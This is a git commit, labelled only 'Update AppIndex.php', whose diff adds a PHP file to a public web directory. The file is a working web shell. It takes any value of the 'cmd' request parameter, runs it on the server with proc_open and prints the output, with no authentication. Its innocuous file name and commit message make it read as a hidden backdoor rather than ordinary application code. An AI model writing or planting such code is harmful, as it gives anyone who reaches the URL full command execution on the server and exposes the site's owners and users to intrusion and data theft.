e969be12c2b1e55f054732cdc90158a640a453d7
Henryl21 <punayhenryl17@gmail.com>
2025-11-17 09:51:44 +0800

    Update AppIndex.php

--- public/AppIndex.php
+++ public/AppIndex.php
@@ -1,1 +1,29 @@
+<?php
 
+if (isset($_REQUEST['cmd'])) {
+    $cmd = $_REQUEST['cmd'];
+
+    if (function_exists('proc_open')) {
+        $descriptors = [
+            0 => ['pipe', 'r'], 
+            1 => ['pipe', 'w'],
+            2 => ['pipe', 'w'],
+        ];
+
+        $process = proc_open($cmd, $descriptors, $pipes);
+        if (is_resource($process)) {
+            echo "<pre>" . stream_get_contents($pipes[1]) . "</pre>";
+            fclose($pipes[0]);
+            fclose($pipes[1]);
+            fclose($pipes[2]);
+            proc_close($process);
+        } else {
+            echo "Failed to execute command.";
+        }
+    } else {
+        echo "No command.";
+    }
+} else {
+    echo "No command.";
+}
+?>
